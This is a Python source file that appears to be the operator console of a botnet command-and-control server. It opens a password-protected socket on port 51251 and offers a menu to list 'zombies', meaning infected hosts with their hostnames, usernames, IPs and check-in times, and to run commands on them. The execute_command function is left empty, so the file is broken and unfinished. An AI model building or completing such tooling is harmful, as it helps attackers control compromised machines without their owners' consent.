import time
import socket
import listener
import bcrypt
from prettytable import PrettyTable
import threading


def list_zombies(socket):

	x = PrettyTable()
	x.field_names = ["id", "uuid", "hostname", "username", "IP", "constrained_language", "last_check_in"]
	counter = 0
	for z in listener.zombies:
		x.add_row([counter, z.uuid, z.hostname, z.username, z.ip, z.clm, z.last_check_in])
		counter = counter + 1

	socket.send(x.get_string().encode())

def execute_command(socket):
	

def close_socket(socket):
	socket.close()




def print_menu(socket):
	menu = """ 

0) List zombies
1) Execute command


99) Exit

Please enter choice: """

	socket.send(menu.encode())
	choice = int(socket.recv(2048).decode('utf-8'))
	return choice



# Thread class that handles client connection
class ClientThread(threading.Thread):
	def __init__(self,clientsocket,clientAddress):
        	threading.Thread.__init__(self)
        	self.clientsocket = clientsocket

	def run(self):
		# bcrypt password hash
		hash = b'$2b$12$5f2z5D3nmeGV0bVOKmJlXuM0ncQXHu9IokJWe/XZZEVc4cxUV3sZS'
		self.clientsocket.send(b'Please enter password: ')
		password = self.clientsocket.recv(2048)
		if not bcrypt.checkpw(password, hash):
			self.clientsocket.close()
		while self.clientsocket.fileno() != -1:
			choice = print_menu(self.clientsocket)
			# List zombies
			if choice == 0:
				list_zombies(self.clientsocket)
			# Execute command
			elif choice == 1:
				execute_command(self.clientsocket)
			# Close socket
			elif choice == 99:
				# Exit
				close_socket(self.clientsocket)
			else:
				# Exit
				close_socket(self.clientsocket)


# Parent thread that handles creation of socket 
def start():
	# create an INET, STREAMing socket
	serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	# unblock socket for reuse
	serversocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	# bind the socket
	serversocket.bind(("0.0.0.0", 51251))
	# become a server socket
	serversocket.listen(5)
	
	
	# Spawning new thread for each client connection
	while True:
		(clientsocket, address) = serversocket.accept()
		newthread = ClientThread(clientsocket,address)
		newthread.start()
